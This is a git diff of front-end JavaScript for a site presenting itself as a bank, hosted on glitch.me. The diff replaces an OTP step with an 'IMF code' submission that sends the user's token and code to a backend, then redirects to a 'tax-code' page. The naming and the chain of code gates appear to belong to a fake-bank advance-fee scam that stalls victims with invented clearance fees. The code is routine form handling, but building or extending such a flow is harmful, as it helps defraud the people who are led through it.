@@ -17,11 +17,12 @@ const getCookie = (cname) => {
 let token = getCookie("token");
 let user = getCookie("user");
 
-const submit_otp = async (user_form) => {
+const submit_imf_code = async (user_form) => {
   document.querySelector("#submit").innerHTML = "Proccessing...";
   try {
     const response = await fetch(
-      "https://zionintercontinentalbnk-biz-backend.glitch.me/api/user/transaction/complete",
+      "https://zionintercontinentalbnk-biz-backend.glitch.me/api/user/submit_imf_code",
+      // "http://localhost:3000/api/user/submit_imf_code",
       {
         method: "POST",
         headers: { "content-type": "application/json" },
@@ -37,7 +38,7 @@ const submit_otp = async (user_form) => {
     } else {
       document.querySelector("#submit").innerHTML = "Success";
       document.querySelector(".errMessage").innerHTML = "";
-      window.location.replace("/dashboard.html");
+      window.location.replace("/tax-code.html");
     }
   } catch (err) {
     console.log(err);
@@ -48,14 +49,14 @@ const submit_otp = async (user_form) => {
 
 document.querySelector("#submit").onclick = () => {
   //  alert("clicked")
-  let otp = document.querySelector("#otp");
-  if (!otp.value)
-    return (document.querySelector("#otp").style.border = "2px solid red");
+  let imf_code = document.querySelector("#imf_code");
+  if (!imf_code.value)
+    return (document.querySelector("#imf_code").style.border = "2px solid red");
 
-  submit_otp({
+  submit_imf_code({
     token,
     user,
-    otp: otp.value,
+    imf_code: imf_code.value,
   });
 };
 document.querySelectorAll("input").forEach(
@@ -66,5 +67,5 @@ document.querySelectorAll("input").forEach(
       //   document.querySelector("#pin_error").innerHTML = "";
       //   document.querySelector("#b_m_n").innerHTML = "";
       document.querySelector(".errMessage").innerHTML = "";
-    })
+    }),
 );
